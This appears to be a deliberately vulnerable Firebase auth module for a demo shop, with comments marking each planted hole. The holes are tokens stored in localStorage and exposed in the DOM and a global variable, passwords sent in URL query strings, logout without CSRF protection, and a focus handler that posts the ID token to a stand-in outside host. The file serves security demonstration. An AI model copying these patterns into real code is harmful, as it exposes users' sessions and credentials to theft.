
import { initializeApp } from 'firebase/app';
import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, signOut, onAuthStateChanged, User } from 'firebase/auth';
import { getFirestore } from 'firebase/firestore';
import { getStorage } from 'firebase/storage';
import { getDatabase, ref, set, get, push, remove, update, onValue, off, query, orderByChild } from 'firebase/database';

// Your web app's Firebase configuration
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
  apiKey: "AIzaSyAslWRtZCNwNfTVJHuZuK3BSHLR_hLS4V8",
  authDomain: "sparkle-shop.firebaseapp.com",
  projectId: "sparkle-shop",
  storageBucket: "sparkle-shop.firebasestorage.app",
  messagingSenderId: "206984117631",
  appId: "1:206984117631:web:acf244876aae778c71ee4a",
  measurementId: "YOUR_MEASUREMENT_ID",
  databaseURL: "https://sparkle-shop-default-rtdb.firebaseio.com"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const storage = getStorage(app);
const realtimeDb = getDatabase(app);

// VULNERABLE: Store auth token in localStorage for demonstration
export const storeAuthToken = (user: User) => {
  if (user) {
    // This is a vulnerability! Storing tokens in localStorage makes them vulnerable to XSS
    user.getIdToken().then((token) => {
      localStorage.setItem('firebase_auth_token', token);
      // console.log("Token stored in localStorage:", token);
    });
  }
};

// Authentication functions
export const registerUser = (email: string, password: string) => {
  return createUserWithEmailAndPassword(auth, email, password)
  .then((userCredential) => {
    // VULNERABLE: Store auth token on registration
    storeAuthToken(userCredential.user);
    return userCredential;
  });
};

export const loginUser = (email: string, password: string) => {
  return signInWithEmailAndPassword(auth, email, password)
  .then((userCredential) => {
    // VULNERABLE: Store auth token on login
    storeAuthToken(userCredential.user);
    return userCredential;
  });
};

export const unsafeLogin = (email: string, password: string) => {
  // This creates URL with credentials - vulnerable to exposure in logs, history
  fetch(`/api/login?email=${email}&password=${password}`);
  return loginUser(email, password);
};

// VULNERABLE: No CSRF protection in logout
export const logoutUser = () => {
  // Clear the vulnerable token storage
  localStorage.removeItem('firebase_auth_token');
  return signOut(auth);
};

export const getCurrentUser = () => {
  return auth.currentUser;
};

// Function to manually apply a token to the current session
export const applyToken = async (token: string) => {
  try {
    // Store the token in localStorage
    localStorage.setItem('firebase_auth_token', token);
    
    // Trigger a custom event to notify other components
    window.dispatchEvent(new Event('storage'));
    
    console.log("Token applied, triggering auth refresh");
    return true;
  } catch (error) {
    console.error("Error applying token:", error);
    return false;
  }
};

// VULNERABLE: Refresh token on window focus
window.addEventListener('focus', () => {
  const user = auth.currentUser;
  if (user) {
    // This refreshes and exposes the token on every window focus
    user.getIdToken(true).then((token) => {
      localStorage.setItem('firebase_auth_token', token);
      // console.log("Token refreshed:", token);
      
      // VULNERABLE: Sending token to console and unverified endpoints
      const debugEndpoint = 'https://debug-logger.example.com/log';
      fetch(debugEndpoint, {
        method: 'POST',
        body: JSON.stringify({ token }),
        headers: { 'Content-Type': 'application/json' }
      }).catch(() => {});
    });
  }
});

export const onAuthStateChange = (callback: (user: User | null) => void) => {
  return onAuthStateChanged(auth, (user) => {
    if (user) {
      // VULNERABLE: Store authentication state and token on every auth state change
      storeAuthToken(user);
    }
    callback(user);
  });
};

// VULNERABLE: Expose auth token via DOM for XSS demonstration
export const exposeTokenToDOM = () => {
  const token = localStorage.getItem('firebase_auth_token');
  if (token) {
    // Create a hidden element with the token
    const hiddenElement = document.createElement('div');
    hiddenElement.id = 'auth-token-storage';
    hiddenElement.style.display = 'none';
    hiddenElement.setAttribute('data-token', token);
    document.body.appendChild(hiddenElement);
    
    // Also vulnerable to XSS: setting as a global variable
    (window as any).authToken = token;
  }
};

// Call the expose function on module load
setTimeout(exposeTokenToDOM, 1000);

// New Realtime Database functions
export const writeToDatabase = (path: string, data: any) => {
  const dbRef = ref(realtimeDb, path);
  return set(dbRef, data);
};

export const pushToDatabase = (path: string, data: any) => {
  const dbRef = ref(realtimeDb, path);
  return push(dbRef, data);
};

export const readFromDatabase = (path: string) => {
  const dbRef = ref(realtimeDb, path);
  return get(dbRef);
};

export const updateInDatabase = (path: string, data: any) => {
  const dbRef = ref(realtimeDb, path);
  return update(dbRef, data);
};

export const removeFromDatabase = (path: string) => {
  const dbRef = ref(realtimeDb, path);
  return remove(dbRef);
};

export const listenToDatabase = (path: string, callback: (data: any) => void) => {
  const dbRef = ref(realtimeDb, path);
  onValue(dbRef, (snapshot) => {
    const data = snapshot.val();
    callback(data);
  });
  
  // Return unsubscribe function
  return () => off(dbRef);
};

// New function for querying data
export const queryDatabase = (path: string, orderBy: string) => {
  const dbRef = ref(realtimeDb, path);
  return get(query(dbRef, orderByChild(orderBy)));
};

// New function to initialize products in the database (for first run)
export const initializeProducts = async (products: any[]) => {
  // Check if products already exist
  const productsSnapshot = await readFromDatabase('products');
  if (!productsSnapshot.exists() || Object.keys(productsSnapshot.val() || {}).length === 0) {
    // Add each product with its ID as the key
    const updates: Record<string, any> = {};
    products.forEach(product => {
      updates[`products/${product.id}`] = product;
    });
    console.log("Writing to DB path: 'products'", updates);
    return updateInDatabase('products', updates);
  }
  return Promise.resolve();
};

export { auth, db, storage, realtimeDb };
export default app;
